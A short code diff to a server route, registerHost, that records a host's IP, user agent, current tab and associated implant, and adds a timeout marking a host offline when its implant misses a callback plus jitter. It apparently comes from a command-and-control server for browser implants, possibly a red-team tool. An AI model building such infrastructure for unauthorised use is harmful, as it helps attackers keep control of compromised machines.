@@ -11,7 +11,8 @@ module.exports.registerHost = async (req, res) => {
                         externalIP: req.body.externalIP,
                         userAgent: req.body.userAgent,
                         currentTab: req.body.currentTab,
-                        associatedImplant: req.body.associatedImplant
+                        associatedImplant: req.body.associatedImplant,
+                        offlineAfter: implant.callbackInterval/1000 + implant.maxJitter/1000 + 30 // Used to mark a host as offline if it doesnt callback after the interval + maximum jitter + 30 seconds
                     }).then((host) => {
                         res.status(200).json({
                             id: host._id.toString(),
